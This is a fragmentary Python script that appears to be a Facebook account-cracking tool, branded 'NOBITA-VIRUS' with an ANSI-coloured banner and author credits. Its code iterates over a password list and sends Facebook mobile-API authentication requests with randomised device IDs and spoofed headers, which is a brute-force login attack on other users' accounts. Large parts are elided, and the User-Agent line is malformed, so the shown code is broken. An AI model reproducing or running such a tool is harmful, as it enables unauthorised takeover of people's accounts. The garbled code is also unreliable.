 ...
 \033[1;91m\ \    / /_   _|  __ \| |  | |/ ____|   \ \ / /
  \033[1;94m\ \  / /  | | | |__) | |  | | (___ _____\ V / 
   ...
   \033[1;93m𝙉\033[1;94m𝙊\033[1;91m𝘽\033[1;92m𝙄\033[1;95m𝙏\033[1;90m𝘼\033[1;92m-\033[1;91m𝙑\033[1;94m𝙄\033[1;93m𝙍\033[1;96m𝙐\033[1;95m𝙎
    ...
    \33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝            
     {H} ╔════════════════════════{M}════════════════╗
      {H}║{M}[{H}•{M}] AUTHOR    :{H} TOXIC CYBER             {N}{M}║
      {H}║{M}[{H}•{M}] FACEBOOK  : {H}SHANTO HASAN            {N}{M}║
      {H}║{M}[{H}•{M}] GITHUB    : {H}NOBITA-VIRUS-XD{N}       {H}  ║
    ...
    try:
        for ps in pwx:
            ...
            data={'adid': str(uuid.uuid4()),
                    ...
                    'client_country_code': 'GB',
                    'fb_api_req_friendly_name': 'authenticate'}
            head={f'User-Agent': Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/122.0.6344.197 Chrome/122.0.6344.197 Safari/537.36
                    
                    
                   
                    
                    'X-FB-Friendly-niloy': 'authenticate',
                    'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
                    'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'unknown',
...
#__________________niloy______________________#
...
#_____________{niloy}_______________#
